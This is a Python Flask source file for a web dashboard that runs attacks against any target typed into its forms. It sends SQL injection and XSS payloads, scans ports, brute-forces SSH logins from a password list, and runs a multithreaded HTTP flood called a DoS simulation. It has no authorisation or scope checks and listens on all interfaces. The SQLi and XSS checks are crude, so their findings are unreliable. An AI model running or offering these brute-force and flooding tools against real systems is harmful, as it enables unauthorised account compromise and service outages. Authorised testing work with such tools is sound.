from flask import Flask, request, render_template, send_file, send_from_directory
from flask_socketio import SocketIO
import socket
import threading
import requests
import paramiko
import io
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
import os

app = Flask(__name__)
socketio = SocketIO(app)

# Define the path to the images directory
IMAGE_FOLDER = os.path.join(app.root_path, 'templates')

@app.route('/images/<path:filename>')
def serve_image(filename):
    return send_from_directory(IMAGE_FOLDER, filename)

@app.route('/')
def index():
    return render_template('index.html')

# SQL Injection Test Function
def test_sql_injection(url):
    results = []
    try:
        payload = "' OR '1'='1"
        response = requests.get(url + payload)
        if "error" in response.text or "SQL" in response.text:
            results.append(f"Potential SQL Injection vulnerability found at {url}")
        else:
            results.append(f"No vulnerability detected at {url}")
    except Exception as e:
        results.append(f"Error: {str(e)}")
    return results

@app.route('/test_sql_injection', methods=['POST'])
def handle_sql_injection():
    url = request.form.get('url')
    if not url:
        return "Error: URL is required", 400
    results = test_sql_injection(url)
    return render_template('results.html', results=results)

# Port Scanning Function
def scan_ports(target_ip, port_range):
    results = []
    for port in range(port_range[0], port_range[1] + 1):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)  # Increased timeout to 5 seconds
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                results.append(f"Port {port} is open on {target_ip}")
            else:
                results.append(f"Port {port} is closed on {target_ip}")
            sock.close()
        except Exception as e:
            results.append(f"Error scanning port {port}: {str(e)}")
    return results

@app.route('/scan_ports', methods=['POST'])
def handle_scan_ports():
    target_ip = request.form.get('target_ip')
    port_range_input = request.form.get('port_range')

    if not target_ip or not port_range_input:
        return "Error: Target IP and port range are required", 400

    try:
        if '-' in port_range_input:
            port_range = port_range_input.split('-')
            port_range = (int(port_range[0]), int(port_range[1]))
        else:
            port_range = (int(port_range_input), int(port_range_input))
    except ValueError:
        return "Error: Invalid port range", 400

    results = scan_ports(target_ip, port_range)
    return render_template('results.html', results=results)

# SSH Brute Force Attack Function
def ssh_brute_force(target_ip, username, password_list):
    results = []
    for password in password_list:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target_ip, username=username, password=password, timeout=3)
            results.append(f"Login successful with {username}:{password}")
            ssh.close()
            break
        except paramiko.AuthenticationException:
            results.append(f"Login failed for {username}:{password}")
        except Exception as e:
            results.append(f"Error during SSH brute force: {str(e)}")
    return results

@app.route('/ssh_brute_force', methods=['POST'])
def handle_ssh_brute_force():
    target_ip = request.form.get('target_ip')
    username = request.form.get('username')
    password_list = request.form.get('password_list')
    
    if not target_ip or not username or not password_list:
        return "Error: Target IP, username, and password list are required", 400

    password_list = password_list.split(',')
    results = ssh_brute_force(target_ip, username, password_list)
    return render_template('results.html', results=results)

# DoS Attack Simulation
def dos_attack(target_url, threads_count, request_limit):
    def send_requests():
        for _ in range(request_limit):
            try:
                requests.get(target_url)
            except requests.RequestException:
                pass

    threads = []
    for _ in range(threads_count):
        thread = threading.Thread(target=send_requests)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    return [f"Sent {request_limit} requests across {threads_count} threads to {target_url}"]

@app.route('/dos_attack', methods=['POST'])
def handle_dos_attack():
    target_url = request.form.get('target_url')
    threads_count = request.form.get('threads_count', type=int)
    request_limit = request.form.get('request_limit', type=int)
    
    if not target_url or not threads_count or not request_limit:
        return "Error: Target URL, threads count, and request limit are required", 400

    results = dos_attack(target_url, threads_count, request_limit)
    return render_template('results.html', results=results)

# XSS Testing Function
def test_xss(url):
    results = []
    try:
        payload = "<script>alert('XSS');</script>"
        response = requests.get(url, params={'q': payload})
        if payload in response.text:
            results.append(f"XSS vulnerability found at {url}")
        else:
            results.append(f"No XSS vulnerability found at {url}")
    except Exception as e:
        results.append(f"Error: {str(e)}")
    return results

@app.route('/test_xss', methods=['POST'])
def handle_xss():
    url = request.form.get('url')
    if not url:
        return "Error: URL is required", 400
    results = test_xss(url)
    return render_template('results.html', results=results)

# Generate Report Function
def generate_report(results):
    report_buffer = io.BytesIO()
    pdf = canvas.Canvas(report_buffer, pagesize=letter)
    pdf.drawString(100, 750, "Security Test Report")
    
    y_position = 700
    for result in results:
        pdf.drawString(100, y_position, result)
        y_position -= 20

    pdf.save()
    report_buffer.seek(0)
    return report_buffer

@app.route('/generate_report', methods=['POST'])
def handle_generate_report():
    results = request.form.getlist('results')
    if not results:
        return "Error: No results provided", 400
    
    report = generate_report(results)
    return send_file(report, download_name='report.pdf', as_attachment=True)

if __name__ == "__main__":
    socketio.run(app, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), allow_unsafe_werkzeug=True)

